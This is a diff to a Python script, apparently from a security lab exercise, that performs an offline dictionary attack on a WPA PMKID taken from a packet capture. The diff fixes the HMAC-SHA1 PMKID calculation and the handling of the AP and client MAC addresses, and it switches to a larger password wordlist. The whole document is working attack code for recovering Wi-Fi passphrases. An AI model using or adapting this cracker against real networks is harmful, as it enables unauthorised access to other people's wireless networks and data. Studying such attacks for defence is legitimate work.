@@ -37,20 +37,6 @@ def customPRF512(key, A, B):
     return R[:blen]
 
 
-def get_association_info(packets):
-    """
-    Returns the SSID, AP_MAC and Client_MAC, which are extracted from the association request
-    """
-    for p in packets:
-        if p.haslayer("Dot11AssoReq"):
-            ssid = p.info
-            print(ssid)
-            ap_mac = a2b_hex(p.addr1.replace(':', ''))
-            client_mac = a2b_hex(p.addr2.replace(':', ''))
-            return ssid, ap_mac, client_mac
-    raise Exception("Couldn't find WPA association")
-
-
 def get_pmkid_packet(packets):
     """
     returns the first packet containing a PMKID value. It is always the first message of a 4-way handshake
@@ -75,7 +61,8 @@ def pmkid_bruteforce(pmkid, ssid, mac_ap, mac_sta, const, wordlist):
             # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
             pmk = pbkdf2(hashlib.sha1, passphrase, ssid, 4096, 32)
             # calculate pmkid
-            pmkid_guess = hmac.new(pmk, f"{const}{mac_ap}{mac_sta}")
+            pmkid_guess = hmac.new(pmk, f"{const}{mac_ap}{mac_sta}".encode(),  hashlib.sha1)
+            pmkid_guess = bytes(pmkid_guess.hexdigest(), "utf-8")
 
             print(f"\r{passphrase.decode():20} = {pmkid_guess}          ", end="", flush=True)
 
@@ -90,8 +77,8 @@ def pmkid_bruteforce(pmkid, ssid, mac_ap, mac_sta, const, wordlist):
 def find_ssid(ap_mac, packets):
     for p in packets:
         if p.haslayer("Dot11AssoReq") and p.addr1 == ap_mac:
-            ssid = p.info
-            return ssid
+                ssid = p.info
+                return ssid
 
     raise Exception("Couldn't find the SSID of this MAC address")
 
@@ -100,17 +87,26 @@ def main(pcap_file, dictionary):
     # Read capture file -- it contains beacon, authentication, association, handshake and data
     wpa = rdpcap(pcap_file)
 
+    print("Finding Handshake packet...", end="")
     p = get_pmkid_packet(wpa)
+    print("OK")
 
     pmkid = p.wpa_key[-16:]
 
-    ap_mac = p.addr1
-    sta_mac = p.addr2
-    const = "PMK Name"
+    ap_mac = p.addr2  # we need the byte value to find the ssid
+
+    print("Finding SSID...", end="")
     ssid = find_ssid(ap_mac, wpa)
+    print("OK")
+
+    ap_mac = a2b_hex(ap_mac.replace(':', ''))
+    sta_mac = a2b_hex(p.addr1.replace(':', ''))
+
+    const = "PMK Name"
+
 
     print("Values used to calculate PMKID:")
-    print("PMKID:       ", b2a_hex(ap_mac))
+    print("PMKID:       ", pmkid)
     print("AP Mac:      ", b2a_hex(ap_mac))
     print("CLient Mac:  ", b2a_hex(sta_mac))
     print("SSID:        ", ssid)
@@ -128,7 +124,7 @@ def main(pcap_file, dictionary):
 
 
 if __name__ == "__main__":
-    default_wordlist = "wordlists/WiFi-WPA/probable-v2-wpa-top62.txt"  # https://github.com/Taknok/French-Wordlist
+    default_wordlist = "wordlists/WiFi-WPA/probable-v2-wpa-top4800.txt"  # https://github.com/Taknok/French-Wordlist
     pcap = "PMKID_handshake.pcap"
     main(pcap, default_wordlist)
 
